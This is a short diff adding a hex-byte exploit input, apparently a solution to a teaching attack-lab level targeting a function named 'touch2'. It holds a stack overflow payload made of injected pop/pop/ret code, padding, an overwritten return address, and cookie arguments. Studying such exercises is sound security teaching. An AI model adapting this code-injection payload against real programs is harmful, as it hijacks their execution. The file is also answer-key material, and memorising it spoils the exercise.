@@ -1,0 +1,15 @@
+/* Injected code */
+5f /* pop rdi first argument which is cookie */
+5e /* pop rsi second argument which is cookie XOR 0xdeadbeef */
+c3 /* ret */
+/* Padding */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Return address: make it point to Injected code */
+e8 99 66 55 00 00 00 00
+/* Argument1 cookie */
+45 ff 1e 3c 00 00 00 00
+/* Argument2 cookie XOR 0xdeadbeef */
+aa 41 b3 e2 00 00 00 00
+/* Return address: touch2 */
+d5 27 40 00 00 00 00 00                      
+
